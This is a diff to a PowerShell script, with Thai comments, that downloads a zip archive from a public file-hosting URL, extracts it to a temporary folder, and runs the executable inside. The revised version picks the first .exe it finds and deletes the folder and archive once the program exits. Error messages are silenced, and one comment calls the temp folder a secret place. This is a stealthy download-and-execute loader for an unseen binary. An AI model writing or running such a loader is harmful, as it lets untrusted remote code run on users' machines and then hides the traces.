@@ -1,26 +1,22 @@
-# ปิดการแจ้งเตือนทั้งหมด
 $ErrorActionPreference = 'SilentlyContinue'
 
-$exeName = "Setting GodX.exe"
-$zipName = "Setting GodX.zip"
-$url = "https://files.catbox.moe/afb9rh.zip"
-$tempPath = "$env:TEMP\GodX_App"
-$zipPath = "$tempPath\$zipName"
+# 1. ตั้งชื่อตัวแปร
+$zipUrl = "https://files.catbox.moe/afb9rh.zip"
+$tempZip = [System.IO.Path]::GetTempFileName() + ".zip"
+$tempDir = [System.IO.Path]::GetTempPath() + [System.Guid]::NewGuid().ToString()
 
-# 1. เตรียมโฟลเดอร์
-if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath | Out-Null }
+# 2. ดาวน์โหลดไฟล์ลงที่ลับ (Temp)
+(New-Object System.Net.WebClient).DownloadFile($zipUrl, $tempZip)
 
-# 2. ดาวน์โหลดแบบ Streaming (เร็วที่สุด)
-$wc = New-Object System.Net.WebClient
-$wc.DownloadFile($url, $zipPath)
-
-# 3. แตกไฟล์ .zip แบบ Direct API (เร็วที่สุด ไม่ผ่าน Explorer)
+# 3. สร้างโฟลเดอร์ชั่วคราวและแตกไฟล์
+New-Item -ItemType Directory -Path $tempDir | Out-Null
 Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempPath)
+[System.IO.Compression.ZipFile]::ExtractToDirectory($tempZip, $tempDir)
 
-# 4. ลบไฟล์ Zip ทิ้งทันที
-Remove-Item $zipPath -Force
+# 4. หาไฟล์ .exe แล้วรัน
+$exePath = Get-ChildItem -Path $tempDir -Filter "*.exe" | Select-Object -First 1
+$proc = Start-Process $exePath.FullName -WorkingDirectory $tempDir -PassThru -Wait
 
-# 5. รันโปรแกรม (ใช้ & เพื่อรันไฟล์ที่มีเว้นวรรค)
-$exeFullPath = "$tempPath\$exeName"
-& "$exeFullPath"
+# 5. ทันทีที่ปิดโปรแกรม ให้ลบไฟล์และโฟลเดอร์ชั่วคราวทิ้งทั้งหมด
+Remove-Item $tempDir -Recurse -Force
+Remove-Item $tempZip -Force
